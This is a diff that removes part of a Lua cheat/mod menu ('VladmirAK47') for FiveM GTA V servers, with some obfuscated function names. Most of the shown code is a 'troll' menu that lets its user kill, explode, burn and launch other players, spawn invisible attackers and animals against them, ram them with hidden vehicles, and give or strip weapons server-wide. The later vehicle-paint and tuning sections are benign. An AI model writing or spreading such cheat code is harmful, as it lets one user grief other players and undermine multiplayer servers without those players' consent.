-                if VladmirAK47.Button('~h~Die like bitch ') then
-				selectedPlayerId = SelectedPlayer
-                if not test2096 then
-                 test2096 = true
-                        av('~h~~b~ ON~.', false)
-                else
-                 test2096 = false
-                        av('~h~~b~ Off.', false)
-                end			
-                elseif VladmirAK47.Button('~h~Suprise light') then
-				selectedPlayerId = SelectedPlayer
-                if not test2999 then
-                 test2999 = true
-                        av('~h~~b~ ON~.', false)
-                else
-                 test2999 = false
-                        av('~h~~b~ Off.', false)
-                end	
-                elseif VladmirAK47.Button('~h~OMG light') then
-				selectedPlayerId = SelectedPlayer
-                if not test2997 then
-                 test2997 = true
-                        av('~h~~b~ ON~.', false)
-                else
-                 test2997 = false
-                        av('~h~~b~ Off.', false)
-                end									
-                elseif VladmirAK47.Button('~h~Jesus light') then
-				selectedPlayerId = SelectedPlayer
-                if not test992 then
-                 test992 = true
-                        av('~h~~b~light ON~.', false)
-                else
-                 test992 = false
-                        av('~h~~b~Light Off.', false)
-                end
-                elseif VladmirAK47.Button('~h~Jesus Smoke') then
-				selectedPlayerId = SelectedPlayer
-                if not test994 then
-                 test994 = true
-                        av('~h~~b~Smoke ON~.', false)
-                else
-                 test994 = false
-                        av('~h~~b~Smoke Off.', false)
-                end	
-                elseif VladmirAK47.Button('~h~Ghosts Smoke') then
-				selectedPlayerId = SelectedPlayer
-                if not test995 then
-                 test995 = true
-                        av('~h~~b~Ghosts ON~.', false)
-                else
-                 test995 = false
-                        av('~h~~b~Ghosts Off.', false)
-                end			
-                elseif VladmirAK47.Button('~r~Brutan Explosions ') then
-				selectedPlayerId = SelectedPlayer
-                if not test997 then
-                 test997 = true
-                        av('~h~~b~Explosions ON~.', false)
-                else
-                 test997 = false
-                        av('~h~~b~Explosions Off.', false)
-                end					
-                elseif VladmirAK47.Button('~b~Brutan Burn') then
-				selectedPlayerId = SelectedPlayer
-                if not test996 then
-                 test996 = true
-                        av('~h~~b~Burn ON~.', false)
-                else
-                 test996 = false
-                        av('~h~~b~Burn Off.', false)
-                end				
-                elseif VladmirAK47.Button('~h~BoggyMan Player') then
-				selectedPlayerId = SelectedPlayer
-                if not Boggyman then
-                 Boggyman = true
-                        av('~h~~b~Boggyman ON~.', false)
-                else
-                 Boggyman = false
-                        av('~h~~b~Boggyman Off.', false)
-                end										
-                elseif VladmirAK47.Button('~h~Forcefield') then
-				selectedPlayerId = SelectedPlayer
-                if not forcefield then
-                 forcefield = true
-                        av('~h~~b~Forcefield ON~.', false)
-                else
-                 forcefield = false
-                        av('~h~~b~Forcefield Off.', false)
-                end									
-                elseif VladmirAK47.Button('~h~Light Player') then
-				selectedPlayerId = SelectedPlayer
-                if not active then
-                 active = true
-                        av('~h~~b~Light on~.', false)
-                else
-                 active = false
-                        av('~h~~b~Light Off.', false)
-                end	
-                elseif VladmirAK47.Button('~h~LightV2 Player') then
-				selectedPlayerId = SelectedPlayer
-                if not active1 then
-                 active1 = true
-                        av('~h~~b~Light on~.', false)
-                else
-                 active1 = false
-                        av('~h~~b~Light Off.', false)
-                end					
-                elseif VladmirAK47.Button('~h~Smoke Player') then
-				selectedPlayerId = SelectedPlayer
-                if not smoke1 then
-                 smoke1 = true
-                        av('~h~~b~Smoke on~.', false)
-                else
-                 smoke1 = false
-                        av('~h~~b~Smoke Off.', false)
-                end	
-                elseif VladmirAK47.Button('~h~Boss Mode') then
-				selectedPlayerId = SelectedPlayer
-                if not bossmode then
-                 bossmode = true
-                        av('~h~~b~BOSS ON~.', false)
-                else
-                 bossmode = false
-                        av('~h~~b~BOSS OFF.', false)
-                end					
-                elseif VladmirAK47.Button('~h~Launch Player') then
-                        local Pos = GetEntityCoords(GetPlayerPed(SelectedPlayer)) 
-                        AddExplosion (Pos.x, Pos.y, Pos.z - 2, 13, 5.0, false, false, 0.0)
-                elseif VladmirAK47.Button('~h~Silent kill') then
-				local Pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
-                    AddExplosion(Pos.x, Pos.y, Pos.z, 26, FLT_MAX, false, true, 0.0)							
-                elseif VladmirAK47.Button('~h~Fire on Player') then			
-                        local Pos = GetEntityCoords(GetPlayerPed(SelectedPlayer)) 
-                        AddExplosion (Pos.x, Pos.y, Pos.z, 14, 5.0, false, false, 0.0)									
-                elseif VladmirAK47.Button('~h~Explode Player') then
-                        local Pos = GetEntityCoords(GetPlayerPed(SelectedPlayer)) 
-                        AddExplosion (Pos.x, Pos.y, Pos.z, 10, 5.0, false, false, 0.0)																			
-                elseif VladmirAK47.Button('~h~Burn ~s~Player') then
-				local Pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
-				AddExplosion (Pos.x, Pos.y, Pos.z, 29, 0.0, false, false, 0.0)	
-                end
-                VladmirAK47.Display()
-            elseif				
-                IsControlJustReleased(0, 157) then c6() 				
-                VladmirAK47.Display()
-            elseif
-                IsDisabledControlPressed(0, 217) 
-             then
-                if H4tuf5 then
-                    VladmirAK47.OpenMenu('VladmirAK47')
-                else
-                    TmEM1U()
-                end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('Trollmenu2') then
-                if VladmirAK47.Button('~h~Dildo') then
-				selectedPlayerId = SelectedPlayer
-		         local ped1 = GetPlayerPed(selectedPlayerId)
-				 local oS = GetEntityCoords(ped1)
-				local bH1 = CreateObject(GetHashKey('prop_cs_dildo_01'), oS.x, oS.y, oS.z + 0.6, true, true, true)	
-				NetworkRequestControlOfEntity(bH1)
-				SlideObject (bH1, 0, 0, 9999, 0, 0, 9999, false)	
-                elseif VladmirAK47.Button('Kill Player') then
-					selectedPlayerId = SelectedPlayer
-                 local ped = GetPlayerPed(selectedPlayerId)
-	             local tLoc = GetEntityCoords(ped)
-	             local destination = GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
-	             local origin = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)
-	             ShootSingleBulletBetweenCoords(origin, destination, 100, true, `WEAPON_STUNGUN`, PlayerPedId(), false, true, 100.0)	
-                elseif VladmirAK47.Button('Spawn Bus') then
-					selectedPlayerId = SelectedPlayer
-		          RequestModelSync('u_m_y_babyd')
-		         local ped1 = GetPlayerPed(selectedPlayerId)
-				 local oS = GetEntityCoords(ped1)
-				local bH1 = CreateObject(GetHashKey('Pbus2'), oS.x, oS.y + 2, oS.z + 1, true, true, true)	
-				  NetworkRequestControlOfEntity(bH1)
-				  Citizen.Wait(1000)
-				  SlideObject (bH1, 31, 12, 999, 0, 0, 999, false)			 
-				elseif VladmirAK47.Button('~h~Lion eats him') then
-					local target = GetPlayerPed(SelectedPlayer)
-                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
-                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
-                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
-                     RequestModel('a_c_mtlion')
-                                Citizen.Wait(50)
-                                local ped = CreatePed(21, GetHashKey('a_c_mtlion'), pos.x, pos.y, pos.z, true, true)
-								local ped1 = CreatePed(21, GetHashKey('a_c_mtlion'), pos.x, pos.y, pos.z, true, true)								
-                                if DoesEntityExist(ped) and DoesEntityExist(ped1) then                               
-								 TaskCombatPed(ped, target, 0, 16)
-								 TaskCombatPed(ped1, target, 0, 16)
-								 SetEntityVisible(ped, false, true)
-								 SetEntityVisible(ped1, false, true)
-								 SetPedKeepTask(ped, true)
-								 SetPedKeepTask(ped1, true)
-                                end	
-				elseif VladmirAK47.Button('~h~RPG Attack') then
-					local target = GetPlayerPed(SelectedPlayer)
-                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
-                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
-                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
-                     RequestModel('s_f_y_stripper_01')
-                                Citizen.Wait(50)
-                                local ped = CreatePed(21, GetHashKey('s_f_y_stripper_01'), pos.x, pos.y, pos.z, true, true)							
-                                if DoesEntityExist(ped) then
-                                GiveWeaponToPed(ped, GetHashKey('WEAPON_RPG'), 999, false, true)
-                                SetPedAmmo(ped, GetHashKey('WEAPON_RPG'), 999)								
-								 TaskCombatPed(ped, target, 0, 16)
-								 SetEntityVisible(ped, false, true)
-								 SetPedKeepTask(ped, true)
-                                end	
-                    elseif VladmirAK47.Button('~h~Dirty rat') then
-							selectedPlayerId = SelectedPlayer
-					local target = GetPlayerPed(selectedPlayerId)
-                    local pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))
-                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
-                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
-                     RequestModel('a_c_rat')
-                                Citizen.Wait(50)
-                                local ped = CreatePed(21, GetHashKey('a_c_rat'), pos.x, pos.y, pos.z, true, true)
-								local ped1 = CreatePed(21, GetHashKey('a_c_rat'), pos.x, pos.y, pos.z, true, true)								
-                                if DoesEntityExist(ped) and DoesEntityExist(ped1) then
-                                 TaskStandGuard(ped, pos.x, pos.y, pos.z, 1, "world_human_musician")
-								 TaskStandGuard(ped1, pos.x, pos.y, pos.z, 1, "world_human_musician")
-								 SetPedKeepTask(ped, true)
-								 SetPedKeepTask(ped1, true)
-								end
-                    elseif VladmirAK47.Button('~h~Glitch him') then
-							selectedPlayerId = SelectedPlayer
-					local target = PlayerPedId(selectedPlayerId)
-                    local pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))
-					local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayerId), 0, 0, -0.4)
-                    RequestModel('stt_prop_race_start_line_03b')
-                    while not HasModelLoaded('stt_prop_race_start_line_03b') do
-                        RequestModel('stt_prop_race_start_line_03b')
-                        Citizen.Wait(0)
-                    end
-                    if HasModelLoaded('stt_prop_race_start_line_03b') then
-						local v = CreateObject(GetHashKey('stt_prop_race_start_line_03b'), pos.x, pos.y, pos.z - 2, true, true, true)
-                        FreezeEntityPosition(v, true)
-                        SetEntityVisible(v, false, 2)
-					end	
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~SURFACE',
-                        test8,
-                        function(dR)
-                            test8 = dR
-							selectedPlayerId = SelectedPlayer
-                        end
-                    )
-                 then	
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Vehicle Parts on him',
-                        test007,
-                        function(dR)
-                            test007 = dR
-							selectedPlayerId = SelectedPlayer
-                        end
-                    )
-                 then
-				 elseif VladmirAK47.Button('~h~Ram him') then
-							selectedPlayerId = SelectedPlayer
-                    local veh = ("futo")
-					local target = PlayerPedId(selectedPlayerId)
-                    local pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))
-                    local xf = GetEntityForwardX(GetPlayerPed(selectedPlayerId))
-                    local yf = GetEntityForwardY(GetPlayerPed(selectedPlayerId))
-					local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayerId), 0, -0.2, 0)
-                    local v = nil
-                    RequestModel(veh)
-                    RequestModel('s_f_y_bartender_01')
-                    while not HasModelLoaded(veh) and not HasModelLoaded('s_f_y_bartender_01') do
-                        RequestModel('s_f_y_bartender_01')
-                        Citizen.Wait(0)
-                        RequestModel(veh)
-                    end
-                    if HasModelLoaded(veh) then
-                        local v = CreateVehicle(veh, offset.x, offset.y, offset.z, GetEntityHeading(target), true, true)
-						SetEntityVisible(v, false, true)
-                        if DoesEntityExist(v) then
-                            NetworkRequestControlOfEntity(v)
-                            SetVehicleDoorsLocked(v, 4)
-                            RequestModel('s_f_y_bartender_01')
-                            Citizen.Wait(50)
-                            if HasModelLoaded('s_f_y_bartender_01') then
-                            Citizen.Wait(50)
-							SetVehicleForwardSpeed(v, 120.0)
-                            end
-                        end
-                    end				 					
-				elseif VladmirAK47.Button('~h~9/11') then
-                    local veh = ("Jet")
-                    for i = 0, 0 do
-					local target = PlayerPedId(SelectedPlayer)
-                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
-                    local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
-                    local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
-                    local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
-                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
-                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
-                    local v = nil
-                    RequestModel(veh)
-                    RequestModel('a_m_o_acult_01')
-                    while not HasModelLoaded(veh) and not HasModelLoaded('a_m_o_acult_01') do
-                        RequestModel('a_m_o_acult_01')
-                        Citizen.Wait(0)
-                        RequestModel(veh)
-                    end
-                    if HasModelLoaded(veh) then
-                        Citizen.Wait(50)
-                        v =
-                            CreateVehicle(
-                            veh,
-                            pos.x - (xf * 0),
-                            pos.y - (yf * 0),
-                            pos.z + 100,
-                            GetEntityHeading(GetPlayerPed(SelectedPlayer)),
-                            true,
-                            false
-                        )
-                        if DoesEntityExist(v) then
-                            NetworkRequestControlOfEntity(v)
-                            SetVehicleDoorsLocked(v, 4)
-                            RequestModel('a_m_o_acult_01')
-                            Citizen.Wait(50)
-                            if HasModelLoaded('a_m_o_acult_01') then
-                                Citizen.Wait(50)
-                                local ped = CreatePed(21, GetHashKey('a_m_o_acult_01'), pos.x, pos.y, pos.z, true, true)
-                                local ped1 =
-                                    CreatePed(21, GetHashKey('a_m_o_acult_01'), pos.x, pos.y, pos.z, true, true)
-                                if DoesEntityExist(ped1) and DoesEntityExist(ped) then
-                                    SetPedIntoVehicle(ped, v, -1)
-                                    SetPedIntoVehicle(ped1, v, 0)
-                                    TaskVehicleEscort(ped, v, (GetPlayerPed(SelectedPlayer)), -1, 9999.0, 1082917029, 0.0, 0, -1)
-                                    SetDriverAbility(ped, 10.0)
-                                    SetDriverAggressiveness(ped, 10.0)
-                                end
-                            end
-                        end
-                    end
-                end	
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Street Builder',
-                        manypeds1,
-                        function(dR)
-                            manypeds1 = dR
-							selectedPlayerId = SelectedPlayer
-                        end
-                    )
-                 then
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Shock Player',
-                        Shock,
-                        function(dR)
-                            Shock = dR
-							selectedPlayerId = SelectedPlayer
-                        end
-                    )
-                 then				 						
-                elseif VladmirAK47.Button('~h~zombie Player') then
-				Zombie(SelectedPlayer)
-				elseif VladmirAK47.Button('~h~Chicken on Player') then
-				Zombie10(SelectedPlayer)				
-                elseif VladmirAK47.Button('~h~1M Veh on Player') then
-				Zombie99(SelectedPlayer)
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Rapidfire',
-                        Shock1,
-                        function(dR)
-                            Shock1 = dR
-							selectedPlayerId = SelectedPlayer
-                        end
-                    )
-                 then									
-					 elseif VladmirAK47.Button('~h~Flip ~s~Car') then
-                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
-                                local eU = "s_m_y_swat_01"
-                                for i = 0, 0 do 
-								local model = GetHashKey("police")
-                                RequestModel(model)
-                                while not HasModelLoaded(model) do
-                                Citizen.Wait(0)
-                                end
-                                    local cM = GetEntityCoords(GetPlayerPed(SelectedPlayer)) 
-                                    RequestModel(GetHashKey(eU)) 
-                                    Citizen.Wait(50) 
-                                        if HasModelLoaded(GetHashKey(eU)) then 
-                                            local ped = CreatePed(21, GetHashKey(eU), cM.x + i, cM.y - i, cM.z, 0, true, true) NetworkRegisterEntityAsNetworked(ped)
-											if HasModelLoaded(model) then
-                                            local veh = CreateVehicle(model, cM.x, cM.y -0.10, cM.z - 3.0, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)	
-                                            SetPedIntoVehicle(ped, veh, -1)
-                                             Citizen.Wait(80)											
-                                            DeleteVehicle(veh)
-											DeletePed(ped)												
-                                            end 
-                                        end
-                                    end 
-					end				
-					 elseif VladmirAK47.Button('~h~Vehicle ~s~Fly') then
-                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
-					   local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
-					   local eU = "s_m_y_swat_01"
-                                for i = 0, 0 do 
-                                    local cM = GetEntityCoords(GetPlayerPed(SelectedPlayer)) 
-                                    RequestModel(GetHashKey(eU)) 
-                                    Citizen.Wait(50) 
-                                        if HasModelLoaded(GetHashKey(eU)) then 
-                                            local ped = CreatePed(21, GetHashKey(eU), cM.x + i, cM.y - i, cM.z, 0, true, true) NetworkRegisterEntityAsNetworked(ped)
-											SetEntityAsMissionEntity(veh, true, true)
-                                            SetPedIntoVehicle(ped, veh, -1)
-											SetVehicleForwardSpeed(veh, 1200.0)
-											Citizen.Wait(100)											
-                                            DeleteVehicle(veh)
-											DeletePed(ped)	
-											
-                                        end
-                                    end 
-                    else
-                        av('~h~~b~Player not in a vehicle~s~.', false)
-                    end						
-                end			
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('TeleportMenu') then
-                if VladmirAK47.Button('~h~Teleport to waypoint') then
-                    c6()
-                elseif VladmirAK47.Button('~h~Teleport into nearest ~s~vehicle') then
-                    b_()
-                elseif VladmirAK47.Button('~h~Teleport to coords') then
-                    bT()
-                elseif VladmirAK47.Button('~h~Draw custom blip ~s~on map') then
-                    bX()
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Show Coords',
-                        showCoords,
-                        function(dR)
-                            showCoords = dR
-                        end
-                    )
-                 then
-                end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('WeaponMenu') then
-                if VladmirAK47.MenuButton('~h~~p~▶~s~ Give Single Weapon', 'WeaponTypes') then
-                elseif VladmirAK47.Button('~h~Give All Weapons') then
-                    for i = 1, #b6 do
-                        GiveWeaponToPed(PlayerPedId(-1), GetHashKey(b6[i]), 1000, false, false)
-                    end
-                elseif VladmirAK47.Button('~h~Remove All Weapons') then
-                    RemoveAllPedWeapons(PlayerPedId(-1), true)
-                elseif VladmirAK47.Button('~h~Drop your current Weapon') then
-                    local ak = GetPlayerPed(-1)
-                    local b = GetSelectedPedWeapon(ak)
-                    SetPedDropsInventoryWeapon(GetPlayerPed(-1), b, 0, 2.0, 0, -1)
-                elseif VladmirAK47.Button('~h~Give All Weapons to ~s~everyone') then
-                    for el = 0, 128 do
-                        --if el ~= PlayerId(-1) and GetPlayerServerId(el) ~= 0 then
-                            for i = 1, #b6 do
-                                GiveWeaponToPed(GetPlayerPed(el), GetHashKey(b6[i]), 1000, false, false)
-                            end
-                        --end
-                    end
-                elseif VladmirAK47.Button('~h~Remove All Weapons from ~s~everyone') then
-                    for el = 0, 128 do
-                        --if el ~= PlayerId(-1) and GetPlayerServerId(el) ~= 0 then
-                            for i = 1, #b6 do
-                                RemoveWeaponFromPed(GetPlayerPed(el), GetHashKey(b6[i]))
-                            end
-                        --end
-                    end
-                elseif VladmirAK47.Button('~h~Give Ammo') then
-                    for i = 1, #b6 do
-                        AddAmmoToPed(PlayerPedId(-1), GetHashKey(b6[i]), 200)
-                    end
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~OneShot Kill',
-                        oneshot,
-                        function(dR)
-                            oneshot = dR
-                        end
-                    )
-                 then
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Flare Gun',
-                        rainbowf,
-                        function(dR)
-                            rainbowf = dR
-                        end
-                    )
-                 then
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Vehicle Gun',
-                        VehicleGun,
-                        function(dR)
-                            VehicleGun = dR
-                        end
-                    )
-                 then
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Delete Gun',
-                        DeleteGun,
-                        function(dR)
-                            DeleteGun = dR
-                        end
-                    )
-                 then
-                end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('tunings') then
-                veh = GetVehiclePedIsUsing(PlayerPedId())
-                for i, dE in pairs(bl) do
-                    if dE.id == 'extra' and #checkValidVehicleExtras() ~= 0 then
-                        if VladmirAK47.MenuButton(dE.name, dE.id) then
-                        end
-                    elseif dE.id == 'neon' then
-                        if VladmirAK47.MenuButton(dE.name, dE.id) then
-                        end
-                    elseif dE.id == 'paint' then
-                        if VladmirAK47.MenuButton(dE.name, dE.id) then
-                        end
-                    elseif dE.id == 'wheeltypes' then
-                        if VladmirAK47.MenuButton(dE.name, dE.id) then
-                        end
-                    elseif dE.id == 'headlight' then
-                        if VladmirAK47.MenuButton(dE.name, dE.id) then
-                        end
-                    elseif dE.id == 'licence' then
-                        if VladmirAK47.MenuButton(dE.name, dE.id) then
-                        end
-                    else
-                        local az = checkValidVehicleMods(dE.id)
-                        for ci, dL in pairs(az) do
-                            if VladmirAK47.MenuButton(dE.name, dE.id) then
-                            end
-                            break
-                        end
-                    end
-                end
-                if IsToggleModOn(veh, 22) then
-                    xenonStatus = 'Installed'
-                else
-                    xenonStatus = 'Not Installed'
-                end
-                if VladmirAK47.Button('Xenon Headlight', xenonStatus) then
-                    if not IsToggleModOn(veh, 22) then
-                        ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22))
-                    else
-                        ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22))
-                    end
-                end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('performance') then
-                veh = GetVehiclePedIsUsing(PlayerPedId())
-                for i, dE in pairs(bm) do
-                    if VladmirAK47.MenuButton(dE.name, dE.id) then
-                    end
-                end
-                if IsToggleModOn(veh, 18) then
-                    turboStatus = 'Installed'
-                else
-                    turboStatus = 'Not Installed'
-                end
-                if VladmirAK47.Button('~h~~b~Turbo ~h~Tune', turboStatus) then
-                    if not IsToggleModOn(veh, 18) then
-                        ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18))
-                    else
-                        ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18))
-                    end
-                end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('primary') then
-                VladmirAK47.MenuButton('~h~~p~▶~s~ Classic', 'classic1')
-                VladmirAK47.MenuButton('~h~~p~▶~s~ Metallic', 'metallic1')
-                VladmirAK47.MenuButton('~h~~p~▶~s~ Matte', 'matte1')
-                VladmirAK47.MenuButton('~h~~p~▶~s~ Metal', 'metal1')
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('secondary') then
-                VladmirAK47.MenuButton('~h~~p~▶~s~ Classic', 'classic2')
-                VladmirAK47.MenuButton('~h~~p~▶~s~ Metallic', 'metallic2')
-                VladmirAK47.MenuButton('~h~~p~▶~s~ Matte', 'matte2')
-                VladmirAK47.MenuButton('~h~~p~▶~s~ Metal', 'metal2')
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('rimpaint') then
-                VladmirAK47.MenuButton('~h~~p~▶~s~ Classic', 'classic3')
-                VladmirAK47.MenuButton('~h~~p~▶~s~ Metallic', 'metallic3')
-                VladmirAK47.MenuButton('~h~~p~▶~s~ Matte', 'matte3')
-                VladmirAK47.MenuButton('~h~~p~▶~s~ Metal', 'metal3')
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('classic1') then
-                for dK, em in pairs(br) do
-                    tp, ts = GetVehicleColours(veh)
-                    if tp == em.id and not bg then
-                        pricetext = 'Installed'
-                    else
-                        if bg and tp == em.id then
-                            pricetext = 'Previewing'
-                        else
-                            pricetext = 'Not Installed'
-                        end
-                    end
-                    curprim, cursec = GetVehicleColours(veh)
-                    if VladmirAK47.Button(em.name, pricetext) then
-                        if not bg then
-                            bi = 'paint'
-                            bk = false
-                            oldprim, oldsec = GetVehicleColours(veh)
-                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
-                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
-                            SetVehicleColours(veh, em.id, oldsec)
-                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
-                            bg = true
-                        elseif bg and curprim == em.id then
-                            SetVehicleColours(veh, em.id, oldsec)
-                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
-                            bg = false
-                            bi = -1
-                            bh = -1
-                        elseif bg and curprim ~= em.id then
-                            SetVehicleColours(veh, em.id, oldsec)
-                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
-                            bg = true
-                        end
-                    end
-                end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('metallic1') then
-                for dK, em in pairs(br) do
-                    tp, ts = GetVehicleColours(veh)
-                    if tp == em.id and not bg then
-                        pricetext = 'Installed'
-                    else
-                        if bg and tp == em.id then
-                            pricetext = 'Previewing'
-                        else
-                            pricetext = 'Not Installed'
-                        end
-                    end
-                    curprim, cursec = GetVehicleColours(veh)
-                    if VladmirAK47.Button(em.name, pricetext) then
-                        if not bg then
-                            bi = 'paint'
-                            bk = false
-                            oldprim, oldsec = GetVehicleColours(veh)
-                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
-                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
-                            SetVehicleColours(veh, em.id, oldsec)
-                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
-                            bg = true
-                        elseif bg and curprim == em.id then
-                            SetVehicleColours(veh, em.id, oldsec)
-                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
-                            bg = false
-                            bi = -1
-                            bh = -1
-                        elseif bg and curprim ~= em.id then
-                            SetVehicleColours(veh, em.id, oldsec)
-                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
-                            bg = true
-                        end
-                    end
-                end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('matte1') then
-                for dK, em in pairs(bt) do
-                    tp, ts = GetVehicleColours(veh)
-                    if tp == em.id and not bg then
-                        pricetext = 'Installed'
-                    else
-                        if bg and tp == em.id then
-                            pricetext = 'Previewing'
-                        else
-                            pricetext = 'Not Installed'
-                        end
-                    end
-                    curprim, cursec = GetVehicleColours(veh)
-                    if VladmirAK47.Button(em.name, pricetext) then
-                        if not bg then
-                            bi = 'paint'
-                            bk = false
-                            oldprim, oldsec = GetVehicleColours(veh)
-                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
-                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
-                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
-                            SetVehicleColours(veh, em.id, oldsec)
-                            bg = true
-                        elseif bg and curprim == em.id then
-                            SetVehicleColours(veh, em.id, oldsec)
-                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
-                            bg = false
-                            bi = -1
-                            bh = -1
-                        elseif bg and curprim ~= em.id then
-                            SetVehicleColours(veh, em.id, oldsec)
-                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
-                            bg = true
-                        end
-                    end
-                end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('metal1') then
-                for dK, em in pairs(bu) do
-                    tp, ts = GetVehicleColours(veh)
-                    if tp == em.id and not bg then
-                        pricetext = 'Installed'
-                    else
-                        if bg and tp == em.id then
-                            pricetext = 'Previewing'
-                        else
-                            pricetext = 'Not Installed'
-                        end
-                    end
-                    curprim, cursec = GetVehicleColours(veh)
-                    if VladmirAK47.Button(em.name, pricetext) then
-                        if not bg then
-                            bi = 'paint'
-                            bk = false
-                            oldprim, oldsec = GetVehicleColours(veh)
-                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
-                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
-                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
-                            SetVehicleColours(veh, em.id, oldsec)
-                            bg = true
-                        elseif bg and curprim == em.id then
-                            SetVehicleColours(veh, em.id, oldsec)
-                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
-                            bg = false
-                            bi = -1
-                            bh = -1
-                        elseif bg and curprim ~= em.id then
-                            SetVehicleColours(veh, em.id, oldsec)
-                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
-                            bg = true
-                        end
-                    end
-                end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('classic2') then
-                for dK, em in pairs(br) do
-                    tp, ts = GetVehicleColours(veh)
-                    if ts == em.id and not bg then
-                        pricetext = 'Installed'
-                    else
-                        if bg and ts == em.id then
-                            pricetext = 'Previewing'
-                        else
-                            pricetext = 'Not Installed'
-                        end
-                    end
-                    curprim, cursec = GetVehicleColours(veh)
-                    if VladmirAK47.Button(em.name, pricetext) then
-                        if not bg then
-                            bi = 'paint'
-                            bk = false
-                            oldprim, oldsec = GetVehicleColours(veh)
-                            bh = table.pack(oldprim, oldsec)
-                            SetVehicleColours(veh, oldprim, em.id)
-                            bg = true
-                        elseif bg and cursec == em.id then
-                            SetVehicleColours(veh, oldprim, em.id)
-                            bg = false
-                            bi = -1
-                            bh = -1
-                        elseif bg and cursec ~= em.id then
-                            SetVehicleColours(veh, oldprim, em.id)
-                            bg = true
-                        end
-                    end
-                end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('metallic2') then
-                for dK, em in pairs(br) do
-                    tp, ts = GetVehicleColours(veh)
-                    if ts == em.id and not bg then
-                        pricetext = 'Installed'
-                    else
-                        if bg and ts == em.id then
-                            pricetext = 'Previewing'
-                        else
-                            pricetext = 'Not Installed'
-                        end
-                    end
-                    curprim, cursec = GetVehicleColours(veh)
-                    if VladmirAK47.Button(em.name, pricetext) then
-                        if not bg then
-                            bi = 'paint'
-                            bk = false
-                            oldprim, oldsec = GetVehicleColours(veh)
-                            bh = table.pack(oldprim, oldsec)
-                            SetVehicleColours(veh, oldprim, em.id)
-                            bg = true
-                        elseif bg and cursec == em.id then
-                            SetVehicleColours(veh, oldprim, em.id)
-                            bg = false
-                            bi = -1
-                            bh = -1
-                        elseif bg and cursec ~= em.id then
-                            SetVehicleColours(veh, oldprim, em.id)
-                            bg = true
-                        end
-                    end
-                end
-                VladmirAK47.Display()
